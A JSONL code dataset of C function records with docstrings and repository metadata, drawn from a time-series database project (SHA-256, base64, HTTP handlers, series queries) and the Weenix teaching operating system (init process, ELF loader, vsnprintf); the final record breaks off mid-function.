{"docstring": "/*\n * SHA-256 HMAC final digest\n */\n", "func_signal": "void sha2_hmac_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    int is224, hlen;\n    unsigned char tmpbuf[32];\n\n    is224 = ctx->is224;\n    hlen = ( is224 == 0 ) ? 32 : 28;\n\n    sha2_finish( ctx, tmpbuf );\n    sha2_starts( ctx, is224 );\n    sha2_update( ctx, ctx->opad, 64 );\n    sha2_update( ctx, tmpbuf, hlen );\n    sha2_finish( ctx, output );\n\n    memset( tmpbuf, 0, sizeof( tmpbuf ) );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * SHA-256 HMAC context setup\n */\n", "func_signal": "void sha2_hmac_starts( sha2_context *ctx, const unsigned char *key, size_t keylen,\n                       int is224 )", "code": "{\n    size_t i;\n    unsigned char sum[32];\n\n    if( keylen > 64 )\n    {\n        sha2( key, keylen, sum, is224 );\n        keylen = ( is224 ) ? 28 : 32;\n        key = sum;\n    }\n\n    memset( ctx->ipad, 0x36, 64 );\n    memset( ctx->opad, 0x5C, 64 );\n\n    for( i = 0; i < keylen; i++ )\n    {\n        ctx->ipad[i] = (unsigned char)( ctx->ipad[i] ^ key[i] );\n        ctx->opad[i] = (unsigned char)( ctx->opad[i] ^ key[i] );\n    }\n\n    sha2_starts( ctx, is224 );\n    sha2_update( ctx, ctx->ipad, 64 );\n\n    memset( sum, 0, sizeof( sum ) );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * SHA-256 context setup\n */\n", "func_signal": "void sha2_starts( sha2_context *ctx, int is224 )", "code": "{\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    if( is224 == 0 )\n    {\n        /* SHA-256 */\n        ctx->state[0] = 0x6A09E667;\n        ctx->state[1] = 0xBB67AE85;\n        ctx->state[2] = 0x3C6EF372;\n        ctx->state[3] = 0xA54FF53A;\n        ctx->state[4] = 0x510E527F;\n        ctx->state[5] = 0x9B05688C;\n        ctx->state[6] = 0x1F83D9AB;\n        ctx->state[7] = 0x5BE0CD19;\n    }\n    else\n    {\n        /* SHA-224 */\n        ctx->state[0] = 0xC1059ED8;\n        ctx->state[1] = 0x367CD507;\n        ctx->state[2] = 0x3070DD17;\n        ctx->state[3] = 0xF70E5939;\n        ctx->state[4] = 0xFFC00B31;\n        ctx->state[5] = 0x68581511;\n        ctx->state[6] = 0x64F98FA7;\n        ctx->state[7] = 0xBEFA4FA4;\n    }\n\n    ctx->is224 = is224;\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*!\n * \\brief Built-in read-only file handler\n */\n", "func_signal": "static HTTP_HANDLER(http_get_file)", "code": "{\n\tstruct stat st;\n\tint fd;\n\tFUNCTION_TRACE;\n\t\n\tDEBUG(\"Request for %s returns contents of file: %s\\n\", url, (char*)arg);\n\tfd = open((char*)arg, O_RDONLY);\n\tif (fd < 0) {\n\t\tERROR(\"Open file %s failed: %s\\n\", (char*)arg, strerror(errno));\n\t\treturn MHD_HTTP_NOT_FOUND;\n\t}\n\tif (fstat(fd, &st) < 0) {\n\t\tERROR(\"Stat file %s failed: %s\\n\", (char*)arg, strerror(errno));\n\t\treturn MHD_HTTP_NOT_FOUND;\n\t}\n\tDEBUG(\"Allocating %d bytes\\n\", (int)st.st_size);\n\t*resp_data = malloc(st.st_size);\n\tif (resp_data == NULL) {\n\t\tCRITICAL(\"Out of memory\\n\");\n\t\tclose(fd);\n\t\treturn MHD_HTTP_INTERNAL_SERVER_ERROR;\n\t}\n\t*resp_data_size = read(fd, *resp_data, st.st_size);\n\tclose(fd);\n\t\n\t/* FIXME: Add content type */\n\t\n\treturn MHD_HTTP_OK;\n}", "path": "src\\http.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * SHA-256 final digest\n */\n", "func_signal": "void sha2_finish( sha2_context *ctx, unsigned char output[32] )", "code": "{\n    uint32_t last, padn;\n    uint32_t high, low;\n    unsigned char msglen[8];\n\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_BE( high, msglen, 0 );\n    PUT_UINT32_BE( low,  msglen, 4 );\n\n    last = ctx->total[0] & 0x3F;\n    padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );\n\n    sha2_update( ctx, (unsigned char *) sha2_padding, padn );\n    sha2_update( ctx, msglen, 8 );\n\n    PUT_UINT32_BE( ctx->state[0], output,  0 );\n    PUT_UINT32_BE( ctx->state[1], output,  4 );\n    PUT_UINT32_BE( ctx->state[2], output,  8 );\n    PUT_UINT32_BE( ctx->state[3], output, 12 );\n    PUT_UINT32_BE( ctx->state[4], output, 16 );\n    PUT_UINT32_BE( ctx->state[5], output, 20 );\n    PUT_UINT32_BE( ctx->state[6], output, 24 );\n\n    if( ctx->is224 == 0 )\n        PUT_UINT32_BE( ctx->state[7], output, 28 );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * SHA-256 process buffer\n */\n", "func_signal": "void sha2_update( sha2_context *ctx, const unsigned char *input, size_t ilen )", "code": "{\n    size_t fill;\n    uint32_t left;\n\n    if( ilen <= 0 )\n        return;\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (uint32_t) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (uint32_t) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, fill );\n        sha2_process( ctx, ctx->buffer );\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        sha2_process( ctx, input );\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, ilen );\n    }\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/* TODO: There is room for improvement here.  Where the desired timepoint lies between samples\n * it would be nice to attempt some interpolation */\n", "func_signal": "int tsdb_get_series(tsdb_ctx_t *ctx, unsigned int metric_id, int64_t start, int64_t end, \n\tunsigned int npoints, int flags, tsdb_series_point_t *points)", "code": "{\n\tuint_fast32_t layer_interval, out_interval;\n\tuint_fast32_t point;\n\ttsdb_data_t *layer_values, *ptr;\n\tunsigned int layer;\n\tunsigned int n, naverage, actual_naverage, actual_npoints;\n\t\n\tFUNCTION_TRACE;\n\t\n\t/* Apply automatic limits where start/end not specified */\n\tif (start == TSDB_NO_TIMESTAMP) {\n\t\tstart = ctx->meta->start_time;\n\t}\n\tif (end == TSDB_NO_TIMESTAMP) {\n\t\tend = start + (ctx->meta->npoints * ctx->meta->interval);\n\t}\n\t\n\t/* Sanity check */\n\tif (end < start) {\n\t\tERROR(\"End time must be later than start\\n\");\n\t\treturn -EINVAL;\n\t}\n\tif (metric_id >= ctx->meta->nmetrics) {\n\t\tERROR(\"Requested metric is out of range\\n\");\n\t\treturn -ENOENT;\n\t}\n\tif (npoints == 0) {\n\t\t/* Request for zero points is not an error - just return 0 as requested */\n\t\tINFO(\"Request for no points\\n\");\n\t\treturn 0;\n\t}\n\n\t/* Determine best layer to use for sourcing the result */\n\tif (npoints == 1) {\n\t\t/* Special case - returns the value in between the start and end points */\n\t\tend = start = (start + end) / 2;\n\t\tout_interval = 0;\n\t\tDEBUG(\"Returning single point at %\" PRIi64 \"\\n\", start);\n\t} else {\n\t\tout_interval = (end - start) / (npoints - 1); /* 1 less interval than points */\n\t\tDEBUG(\"Requested %u points on interval %\" PRIuFAST32 \"\\n\", npoints, out_interval);\n\t\tif ((end - start) < (npoints - 1)) {\n\t\t\t/* Minimum interval for output points is 1 second */\n\t\t\tnpoints = end - start + 1;\n\t\t\tout_interval = 1;\n\t\t\tINFO(\"Reduced requested points to %u for minimum 1 second interval\\n\", npoints);\n\t\t}\n\t}\n\t{\n\t\tstruct tm *tmp;\n\t\tchar timestr[100];\n\t\ttime_t t = (time_t)start;\n\t\ttmp = localtime(&t);\n\t\tstrftime(timestr, sizeof(timestr), \"%F %T\", tmp);\n\t\tDEBUG(\"Start time is: %s\\n\", timestr);\n\t}\n\tlayer_interval = ctx->meta->interval;\n\tfor (layer = 0; layer < TSDB_MAX_LAYERS; layer++) {\n\t\tif (ctx->meta->decimation[layer] == 0) {\n\t\t\t/* This is the last layer - we have to use it */\n\t\t\tbreak;\n\t\t}\n\t\tif (layer_interval * ctx->meta->decimation[layer] > out_interval) {\n\t\t\t/* Next layer is downsampled too much, so use this one */\n\t\t\tbreak;\n\t\t}\n\t\tlayer_interval *= ctx->meta->decimation[layer];\n\t}\n\tnaverage = (out_interval > layer_interval) ? out_interval / layer_interval : 1;\n\tDEBUG(\"Using layer %u with interval %\" PRIuFAST32 \" decimation ratio = %u\\n\", layer, layer_interval, \n\t\tnaverage);\n\t\n\t/* Allocate storage for values loaded from input layer */\n\tlayer_values = (tsdb_data_t*)malloc(sizeof(tsdb_data_t) * ctx->meta->nmetrics * naverage);\n\tif (layer_values == NULL) {\n\t\tCRITICAL(\"Out of memory\\n\");\n\t\treturn -ENOMEM;\n\t}\n\t\n\t/* Generate output points by averaging all available input points between the start\n\t * and end times for each output step.  Output timestamps are rounded down onto the\n\t * input interval - there is no interpolation. */\n\tfor (actual_npoints = 0; npoints; npoints--, start += out_interval) {\n\t\t/* Determine if this point is in-range of the input table */\n\t\tif (start < ctx->meta->start_time || \n\t\t\tstart >= ctx->meta->start_time + ctx->meta->npoints * ctx->meta->interval) {\n\t\t\t/* No - there is no data at this time point */\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\t/* There may be data for this point in the table.  Calculate the range of input points\n\t\t * covered by the output period and read them for averaging */\n\t\tpoint = (start - ctx->meta->start_time) / layer_interval;\n\t\tif (lseek(ctx->table_fd[layer], sizeof(tsdb_data_t) * point * ctx->meta->nmetrics, SEEK_SET) < 0) {\n\t\t\tERROR(\"Table seek error for point %\" PRIuFAST32 \": %s\\n\", point, strerror(errno));\n\t\t\treturn -errno;\n\t\t}\n\t\tif (read(ctx->table_fd[layer], layer_values, sizeof(tsdb_data_t) * naverage * ctx->meta->nmetrics) < 0) {\n\t\t\tERROR(\"Table read error for point %\" PRIuFAST32 \": %s\\n\", point, strerror(errno));\n\t\t\treturn -errno;\n\t\t}\n\t\t\n\t\t/* Generate average ignoring any NAN points */\n\t\tpoints->timestamp = start;\n\t\tpoints->value = 0.0;\n\t\tptr = layer_values + metric_id;\n\t\tactual_naverage = 0;\n\t\tfor (n = naverage; n; n--, ptr += ctx->meta->nmetrics) {\n\t\t\tif (!isnan(*ptr)) {\n\t\t\t\tpoints->value += *ptr;\n\t\t\t\tactual_naverage++;\n\t\t\t}\n\t\t}\n\t\tDEBUG(\"averaged %u points\\n\", actual_naverage);\n\t\tif (actual_naverage) {\n\t\t\t/* A valid point was generated */\n\t\t\tpoints->value /= (double)actual_naverage;\n\t\t\tpoints++;\n\t\t\tactual_npoints++;\n\t\t}\n\t}\n\t\n\tfree(layer_values);\n\tDEBUG(\"generated %u points\\n\", actual_npoints);\n\t\n\treturn actual_npoints;\n}", "path": "src\\tsdb.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * Decode a base64-formatted buffer\n */\n", "func_signal": "int base64_decode( unsigned char *dst, size_t *dlen,\n                   const unsigned char *src, size_t slen )", "code": "{\n    size_t i, n;\n    uint32_t j, x;\n    unsigned char *p;\n\n    for( i = j = n = 0; i < slen; i++ )\n    {\n        if( ( slen - i ) >= 2 &&\n            src[i] == '\\r' && src[i + 1] == '\\n' )\n            continue;\n\n        if( src[i] == '\\n' )\n            continue;\n\n        if( src[i] == '=' && ++j > 2 )\n            return( POLARSSL_ERR_BASE64_INVALID_CHARACTER );\n\n        if( src[i] > 127 || base64_dec_map[src[i]] == 127 )\n            return( POLARSSL_ERR_BASE64_INVALID_CHARACTER );\n\n        if( base64_dec_map[src[i]] < 64 && j != 0 )\n            return( POLARSSL_ERR_BASE64_INVALID_CHARACTER );\n\n        n++;\n    }\n\n    if( n == 0 ) {\n    \t*dlen = 0;\n        return( 0 );\n    }\n\n    n = ((n * 6) + 7) >> 3;\n\n    if( *dlen < n )\n    {\n        *dlen = n;\n        return( POLARSSL_ERR_BASE64_BUFFER_TOO_SMALL );\n    }\n\n   for( j = 3, n = x = 0, p = dst; i > 0; i--, src++ )\n   {\n        if( *src == '\\r' || *src == '\\n' )\n            continue;\n\n        j -= ( base64_dec_map[*src] == 64 );\n        x  = (x << 6) | ( base64_dec_map[*src] & 0x3F );\n\n        if( ++n == 4 )\n        {\n            n = 0;\n            if( j > 0 ) *p++ = (unsigned char)( x >> 16 );\n            if( j > 1 ) *p++ = (unsigned char)( x >>  8 );\n            if( j > 2 ) *p++ = (unsigned char)( x       );\n        }\n    }\n\n    *dlen = p - dst;\n\n    return( 0 );\n}", "path": "src\\base64.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int base64_self_test( int verbose )", "code": "{\n    size_t len;\n    unsigned char *src, buffer[128];\n\n    if( verbose != 0 )\n        printf( \"  Base64 encoding test: \" );\n\n    len = sizeof( buffer );\n    src = (unsigned char *) base64_test_dec;\n\n    if( base64_encode( buffer, &len, src, 64 ) != 0 ||\n         memcmp( base64_test_enc, buffer, 88 ) != 0 ) \n    {\n        if( verbose != 0 )\n            printf( \"failed\\n\" );\n\n        return( 1 );\n    }\n\n    if( verbose != 0 )\n        printf( \"passed\\n  Base64 decoding test: \" );\n\n    len = sizeof( buffer );\n    src = (unsigned char *) base64_test_enc;\n\n    if( base64_decode( buffer, &len, src, 88 ) != 0 ||\n         memcmp( base64_test_dec, buffer, 64 ) != 0 )\n    {\n        if( verbose != 0 )\n            printf( \"failed\\n\" );\n\n        return( 1 );\n    }\n\n    if( verbose != 0 )\n        printf( \"passed\\n\\n\" );\n\n    return( 0 );\n}", "path": "src\\base64.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * output = HMAC-SHA-256( hmac key, input buffer )\n */\n", "func_signal": "void sha2_hmac( const unsigned char *key, size_t keylen,\n                const unsigned char *input, size_t ilen,\n                unsigned char output[32], int is224 )", "code": "{\n    sha2_context ctx;\n\n    sha2_hmac_starts( &ctx, key, keylen, is224 );\n    sha2_hmac_update( &ctx, input, ilen );\n    sha2_hmac_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha2_context ) );\n}", "path": "src\\sha2.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*\n * Encode a buffer into base64 format\n */\n", "func_signal": "int base64_encode( unsigned char *dst, size_t *dlen,\n                   const unsigned char *src, size_t slen )", "code": "{\n    size_t i, n;\n    int C1, C2, C3;\n    unsigned char *p;\n\n    if( slen == 0 )\n        return( 0 );\n\n    n = (slen << 3) / 6;\n\n    switch( (slen << 3) - (n * 6) )\n    {\n        case  2: n += 3; break;\n        case  4: n += 2; break;\n        default: break;\n    }\n\n    if( *dlen < n + 1 )\n    {\n        *dlen = n + 1;\n        return( POLARSSL_ERR_BASE64_BUFFER_TOO_SMALL );\n    }\n\n    n = (slen / 3) * 3;\n\n    for( i = 0, p = dst; i < n; i += 3 )\n    {\n        C1 = *src++;\n        C2 = *src++;\n        C3 = *src++;\n\n        *p++ = base64_enc_map[(C1 >> 2) & 0x3F];\n        *p++ = base64_enc_map[(((C1 &  3) << 4) + (C2 >> 4)) & 0x3F];\n        *p++ = base64_enc_map[(((C2 & 15) << 2) + (C3 >> 6)) & 0x3F];\n        *p++ = base64_enc_map[C3 & 0x3F];\n    }\n\n    if( i < slen )\n    {\n        C1 = *src++;\n        C2 = ((i + 1) < slen) ? *src++ : 0;\n\n        *p++ = base64_enc_map[(C1 >> 2) & 0x3F];\n        *p++ = base64_enc_map[(((C1 & 3) << 4) + (C2 >> 4)) & 0x3F];\n\n        if( (i + 1) < slen )\n             *p++ = base64_enc_map[((C2 & 15) << 2) & 0x3F];\n        else *p++ = '=';\n\n        *p++ = '=';\n    }\n\n    *dlen = p - dst;\n    *p = 0;\n\n    return( 0 );\n}", "path": "src\\base64.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/*!\n * \\brief Built-in redirect handler\n */\n", "func_signal": "static HTTP_HANDLER(http_redirect)", "code": "{\n\tFUNCTION_TRACE;\n\t\n\tDEBUG(\"Redirect request for %s to %s\\n\", url, (char*)arg);\n\t\n\t/* Send back specified location in Location: header */\n\t*location = strdup((char*)arg);\n\treturn MHD_HTTP_FOUND; /* 302 Found */\n}", "path": "src\\http.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/* Read a file, parse, render back, etc. */\n", "func_signal": "void dofile(char *filename)", "code": "{\n\tFILE *f=fopen(filename,\"rb\");fseek(f,0,SEEK_END);long len=ftell(f);fseek(f,0,SEEK_SET);\n\tchar *data=malloc(len+1);fread(data,1,len,f);fclose(f);\n\tdoit(data);\n\tfree(data);\n}", "path": "src\\cJSON\\test.c", "repo_name": "mikestir/timestore", "stars": 43, "license": "agpl-3.0", "language": "c", "size": 148}
{"docstring": "/**\n * The init thread's function changes depending on how far along your Weenix is\n * developed. Before VM/FI, you'll probably just want to have this run whatever\n * tests you've written (possibly in a new process). After VM/FI, you'll just\n * exec \"/bin/init\".\n *\n * Both arguments are unused.\n *\n * @param arg1 the first argument (unused)\n * @param arg2 the second argument (unused)\n */\n", "func_signal": "static void *\ninitproc_run(int arg1, void *arg2)", "code": "{\n    static char bullshit[1000];\n    /*run_vmm_tests();*/\n\n    /*kshell_add_command(\"exec\", kshell_exec, \"executes a given command\");*/\n\n    char *empty_args[2] = {\"init\", NULL};\n    char *empty_envp[1] = {NULL};\n    /*kernel_execve(\"/usr/bin/hello\", empty_args, empty_envp);*/\n    kernel_execve(\"/sbin/init\", empty_args, empty_envp);\n    panic(\"oh shit\");\n    \n    /*run_proc_tests();*/\n    /*run_tty_tests();*/\n    /*run_memdev_tests();*/\n    /*[>run_ata_tests();<]*/\n\n/*    int i;*/\n    /*for (i = 0; i < 4; i++){*/\n        /*run_s5fs_tests();*/\n    /*}*/\n    \n    /*vfstest_main(1, NULL);   */\n    \n    return NULL;\n}", "path": "kernel\\main\\kmain.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * This function, called by the idle process (within 'idleproc_run'), creates the\n * process commonly refered to as the \"init\" process, which should have PID 1.\n *\n * The init process should contain a thread which begins execution in\n * initproc_run().\n *\n * @return a pointer to a newly created thread which will execute\n * initproc_run when it begins executing\n */\n", "func_signal": "static kthread_t *\ninitproc_create(void)", "code": "{\n    proc_t *initproc = proc_create(\"init proc\");\n\n    if (initproc == NULL){\n        return NULL;\n    }\n\n    KASSERT(initproc->p_pid == (pid_t) 1 && \"initproc pid isn't 1\");\n\n    kthread_t *init_thread = kthread_create(initproc, initproc_run, NULL, NULL);\n\n    return init_thread;\n}", "path": "kernel\\main\\kmain.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * simple_strtoul - convert a string to an unsigned long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "unsigned long simple_strtoul(const char *cp, char **endp, unsigned int base)", "code": "{\n        unsigned long result = 0, value;\n\n        if (!base) {\n                base = 10;\n                if (*cp == '0') {\n                        base = 8;\n                        cp++;\n                        if ((*cp == 'x') && isxdigit(cp[1])) {\n                                cp++;\n                                base = 16;\n                        }\n                }\n        }\n        while (isxdigit(*cp) &&\n               (value = isdigit(*cp) ? *cp - '0' : toupper(*cp) - 'A' + 10) < base) {\n                result = result * base + value;\n                cp++;\n        }\n        if (endp)\n                *endp = (char *)cp;\n        return result;\n}", "path": "user\\lib\\libc\\vsscanf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * simple_strtoll - convert a string to a signed long long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "long long simple_strtoll(const char *cp, char **endp, unsigned int base)", "code": "{\n        if (*cp == '-')\n                return -simple_strtoull(cp + 1, endp, base);\n        return simple_strtoull(cp, endp, base);\n}", "path": "user\\lib\\libc\\vsscanf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/*\n * This function is called at boot time to initialize the\n * shadow page sub system. Currently it only initializes the\n * shadow_allocator object.\n */\n", "func_signal": "void\nshadow_init()", "code": "{\n    shadow_allocator = slab_allocator_create(\"shadow\", sizeof(mmobj_t));\n    KASSERT(shadow_allocator != NULL && \"failed to create shadow allocator!\");\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/*\n *   ----------------------- top\n *   |                     |          (+phdr->p_memsz)\n *   |  anonymous mapping  |\n *   |        (bss)        |\n *   |                     |\n *   ----------------------- mid2\n *   ----------------------- ztop\n *   |   zeroed out file   |\n *   ----------------------- zbegin   (+phdr->p_filesz)\n *   |                     | mid1\n *   |     mapped file     |\n *   |                     |\n *   |                     |\n *   ----------------------- bottom   (+0)\n */\n", "func_signal": "void _ldmapsect(int fd, unsigned long baseaddr, Elf32_Phdr *phdr, int textrel)", "code": "{\n        uintptr_t vmaddr = ((uintptr_t) phdr->p_vaddr) + baseaddr;\n        uintptr_t offset = phdr->p_offset;\n        uintptr_t memsz = phdr->p_memsz;\n        uintptr_t filsz = phdr->p_filesz;\n\n        uintptr_t map_addr = trunc_page(vmaddr);\n        uintptr_t file_addr = trunc_page(offset);\n        uintptr_t map_len;\n        uintptr_t copy_len;\n        int perms = 0;\n\n        if (phdr->p_flags & PF_R)\n                perms |= PROT_READ;\n        if (phdr->p_flags & PF_W)\n                perms |= PROT_WRITE;\n        if (phdr->p_flags & PF_X)\n                perms |= PROT_EXEC;\n\n        /* Check if read-only sections will need relocation */\n        if (textrel)\n                perms |= PROT_WRITE;\n\n        if (memsz > filsz) {\n                map_len = trunc_page(offset + filsz) - file_addr;\n        } else {\n                map_len = round_page(offset + filsz) - file_addr;\n        }\n\n        if (map_len != 0) {\n                if (mmap((char *) map_addr, map_len, perms,\n                         ((perms & PROT_WRITE) ? MAP_PRIVATE : MAP_SHARED) | MAP_FIXED,\n                         fd, file_addr) == MAP_FAILED) {\n                        printf(err_mapping, map_len, map_addr);\n                        exit(1);\n                }\n        }\n\n        if (memsz == filsz) {\n                return;\n        }\n\n        file_addr = trunc_page(offset + filsz);\n        copy_len = (offset + filsz) - file_addr;\n        map_addr = trunc_page(vmaddr + filsz);\n        map_len = round_page(vmaddr + memsz) - map_addr;\n\n        if (map_len != 0) {\n                void *addr;\n                int zfd = _ldzero();\n                addr = mmap((char *)map_addr, map_len, perms,\n                            MAP_PRIVATE | MAP_FIXED, zfd, 0);\n                if (addr == MAP_FAILED) {\n                        printf(err_zeromap);\n                        exit(1);\n                }\n                close(zfd);\n\n                if (copy_len != 0) {\n                        lseek(fd, file_addr, SEEK_SET);\n                        read(fd, addr, copy_len);\n                }\n        }\n\n}", "path": "user\\lib\\ld-weenix\\ldstart.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* TODO This is a copy of the kernel vsnprintf. It has (almost)\n * no error checking. It also is completely unable to handle\n * floating point. - alvin */\n/**\n* vsnprintf - Format a string and place it in a buffer\n* @buf: The buffer to place the result into\n* @size: The size of the buffer, including the trailing null space\n* @fmt: The format string to use\n* @args: Arguments for the format string\n*\n* Call this function if you are already dealing with a va_list.\n* You probably want snprintf instead.\n */\n", "func_signal": "int vsnprintf(char *buf, size_t size, const char *fmt, va_list args)", "code": "{\n        int len;\n        unsigned long long num;\n        int i, base;\n        char *str, *end, c;\n        const char *s;\n\n        int flags;          /* flags to number() */\n\n        int field_width;    /* width of output field */\n        int precision;              /* min. # of digits for integers; max\n                                   number of chars for from string */\n        int qualifier;              /* 'h', 'l', or 'L' for integer fields */\n        /* 'z' support added 23/7/1999 S.H.    */\n        /* 'z' changed to 'Z' --davidm 1/25/99 */\n\n        str = buf;\n        end = buf + size - 1;\n\n        if (end < buf - 1) {\n                end = ((void *) - 1);\n                size = end - buf + 1;\n        }\n\n        for (; *fmt ; ++fmt) {\n                if (*fmt != '%') {\n                        if (str <= end)\n                                *str = *fmt;\n                        ++str;\n                        continue;\n                }\n\n                /* process flags */\n                flags = 0;\nrepeat:\n                ++fmt;          /* this also skips first '%' */\n                switch (*fmt) {\n                        case '-': flags |= LEFT; goto repeat;\n                        case '+': flags |= PLUS; goto repeat;\n                        case ' ': flags |= SPACE; goto repeat;\n                        case '#': flags |= SPECIAL; goto repeat;\n                        case '0': flags |= ZEROPAD; goto repeat;\n                }\n\n                /* get field width */\n                field_width = -1;\n                if (isdigit(*fmt))\n                        field_width = skip_atoi(&fmt);\n                else if (*fmt == '*') {\n                        ++fmt;\n                        /* it's the next argument */\n                        field_width = va_arg(args, int);\n                        if (field_width < 0) {\n                                field_width = -field_width;\n                                flags |= LEFT;\n                        }\n                }\n\n                /* get the precision */\n                precision = -1;\n                if (*fmt == '.') {\n                        ++fmt;\n                        if (isdigit(*fmt))\n                                precision = skip_atoi(&fmt);\n                        else if (*fmt == '*') {\n                                ++fmt;\n                                /* it's the next argument */\n                                precision = va_arg(args, int);\n                        }\n                        if (precision < 0)\n                                precision = 0;\n                }\n\n                /* get the conversion qualifier */\n                qualifier = -1;\n                if (*fmt == 'h' || *fmt == 'l' || *fmt == 'L' || *fmt == 'Z') {\n                        qualifier = *fmt;\n                        ++fmt;\n                        if (qualifier == 'l' && *fmt == 'l') {\n                                qualifier = 'L';\n                                ++fmt;\n                        }\n                }\n                if (*fmt == 'q') {\n                        qualifier = 'L';\n                        ++fmt;\n                }\n\n                /* default base */\n                base = 10;\n\n                switch (*fmt) {\n                        case 'c':\n                                if (!(flags & LEFT)) {\n                                        while (--field_width > 0) {\n                                                if (str <= end)\n                                                        *str = ' ';\n                                                ++str;\n                                        }\n                                }\n                                c = (unsigned char) va_arg(args, int);\n                                if (str <= end)\n                                        *str = c;\n                                ++str;\n                                while (--field_width > 0) {\n                                        if (str <= end)\n                                                *str = ' ';\n                                        ++str;\n                                }\n                                continue;\n\n                        case 's':\n                                s = va_arg(args, char *);\n                                if (!s)\n                                        s = \"<NULL>\";\n\n                                len = strnlen(s, precision);\n\n                                if (!(flags & LEFT)) {\n                                        while (len < field_width--) {\n                                                if (str <= end)\n                                                        *str = ' ';\n                                                ++str;\n                                        }\n                                }\n                                for (i = 0; i < len; ++i) {\n                                        if (str <= end)\n                                                *str = *s;\n                                        ++str; ++s;\n                                }\n                                while (len < field_width--) {\n                                        if (str <= end)\n                                                *str = ' ';\n                                        ++str;\n                                }\n                                continue;\n\n                        case 'p':\n                                if (field_width == -1) {\n                                        field_width = 2 * sizeof(void *);\n                                        flags |= ZEROPAD;\n                                }\n                                str = number(str, end,\n                                             (unsigned long) va_arg(args, void *),\n                                             16, field_width, precision, flags);\n                                continue;\n\n\n                        case 'n':\n                                /* FIXME:\n                                 * What does C99 say about the overflow case here? */\n                                if (qualifier == 'l') {\n                                        long *ip = va_arg(args, long *);\n                                        *ip = (str - buf);\n                                } else if (qualifier == 'Z') {\n                                        size_t *ip = va_arg(args, size_t *);\n                                        *ip = (str - buf);\n                                } else {\n                                        int *ip = va_arg(args, int *);\n                                        *ip = (str - buf);\n                                }\n                                continue;\n\n                        case '%':\n                                if (str <= end)\n                                        *str = '%';\n                                ++str;\n                                continue;\n\n                                /* integer number formats - set up the flags and \"break\" */\n                        case 'o':\n                                base = 8;\n                                break;\n\n                        case 'X':\n                                flags |= LARGE;\n                        case 'x':\n                                base = 16;\n                                break;\n\n                        case 'd':\n                        case 'i':\n                                flags |= SIGN;\n                        case 'u':\n                                break;\n                                /* Added - TODO - alvin */\n                        case 'f':\n                        case 'F':\n                        case 'g':\n                        case 'G':\n                                return -1;\n\n\n                        default:\n                                if (str <= end)\n                                        *str = '%';\n                                ++str;\n                                if (*fmt) {\n                                        if (str <= end)\n                                                *str = *fmt;\n                                        ++str;\n                                } else {\n                                        --fmt;\n                                }\n                                continue;\n                }\n                if (qualifier == 'L')\n                        num = va_arg(args, long long);\n                else if (qualifier == 'l') {\n                        num = va_arg(args, unsigned long);\n                        if (flags & SIGN)\n                                num = (signed long) num;\n                } else if (qualifier == 'Z') {\n                        num = va_arg(args, size_t);\n                } else if (qualifier == 'h') {\n                        num = (unsigned short) va_arg(args, int);\n                        if (flags & SIGN)\n                                num = (signed short) num;\n                } else {\n                        num = va_arg(args, unsigned int);\n                        if (flags & SIGN)\n                                num = (signed int) num;\n                }\n\n                str = number(str, end, num, base,\n                             field_width, precision, flags);\n        }\n        if (str <= end)\n                *str = '\\0';\n        else if (size > 0)\n                /* don't write out a null byte 